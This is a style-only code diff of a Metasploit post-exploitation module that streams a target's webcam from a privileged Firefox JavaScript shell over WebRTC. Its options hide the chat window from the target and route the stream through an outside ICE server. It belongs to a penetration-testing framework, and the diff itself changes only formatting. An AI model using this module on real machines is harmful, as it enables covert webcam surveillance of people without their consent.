@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,30 +8,28 @@ require 'json'
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
   include Msf::Post::WebRTC
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Firefox Webcam Chat on Privileged Javascript Shell',
-      'Description'   => %q{
-        This module allows streaming a webcam from a privileged Firefox Javascript shell.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'joev' ],
-      'References'    => [
-        [ 'URL', 'http://www.rapid7.com/db/modules/exploit/firefox/local/exec_shellcode' ]
-      ],
-      'DisclosureDate' => 'May 13 2014'
-    ))
+                      'Name'          => 'Firefox Webcam Chat on Privileged Javascript Shell',
+                      'Description'   => %q(
+                        This module allows streaming a webcam from a privileged Firefox Javascript shell.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'joev' ],
+                      'References'    => [
+                        [ 'URL', 'http://www.rapid7.com/db/modules/exploit/firefox/local/exec_shellcode' ]
+                      ],
+                      'DisclosureDate' => 'May 13 2014'))
 
     register_options([
-      OptBool.new('CLOSE', [false, "Forcibly close previous chat session", false]),
-      OptBool.new('VISIBLE', [false, "Show a window containing the chat to the target", false]),
-      OptInt.new('TIMEOUT', [false, "End the chat session after this many seconds", -1]),
-      OptString.new('ICESERVER', [true, "The ICE server that sets up the P2P connection", 'wsnodejs.jit.su:80'])
-    ], self.class)
+                       OptBool.new('CLOSE', [false, "Forcibly close previous chat session", false]),
+                       OptBool.new('VISIBLE', [false, "Show a window containing the chat to the target", false]),
+                       OptInt.new('TIMEOUT', [false, "End the chat session after this many seconds", -1]),
+                       OptString.new('ICESERVER', [true, "The ICE server that sets up the P2P connection", 'wsnodejs.jit.su:80'])
+                     ], self.class)
   end
 
   def run
@@ -58,7 +57,7 @@ class MetasploitModule < Msf::Post
   end
 
   def os_check
-    user_agent = js_exec(%Q|
+    user_agent = js_exec(%|
       return Components.classes["@mozilla.org/network/protocol;1?name=http"]
         .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
     |)
@@ -74,22 +73,22 @@ class MetasploitModule < Msf::Post
     interface.gsub!(/\=OFFERERID\=/, offerer_id)
 
     if datastore['TIMEOUT'] > 0
-      api << "; setTimeout(function(){window.location='about:blank'}, #{datastore['TIMEOUT']*1000}); "
+      api << "; setTimeout(function(){window.location='about:blank'}, #{datastore['TIMEOUT'] * 1000}); "
     end
 
     url = if datastore['CLOSE']
-      '"about:blank"'
-    else
-      '"data:text/html;base64,"+html'
+            '"about:blank"'
+          else
+            '"data:text/html;base64,"+html'
     end
 
     name = if datastore['VISIBLE']
-      Rex::Text.rand_text_alphanumeric(10)
-    else
-      '_self'
+             Rex::Text.rand_text_alphanumeric(10)
+           else
+             '_self'
     end
 
-    %Q|
+    %|
       (function(send){
         try {
 
@@ -108,5 +107,4 @@ class MetasploitModule < Msf::Post
       })(this.send);
     |
   end
-
 end
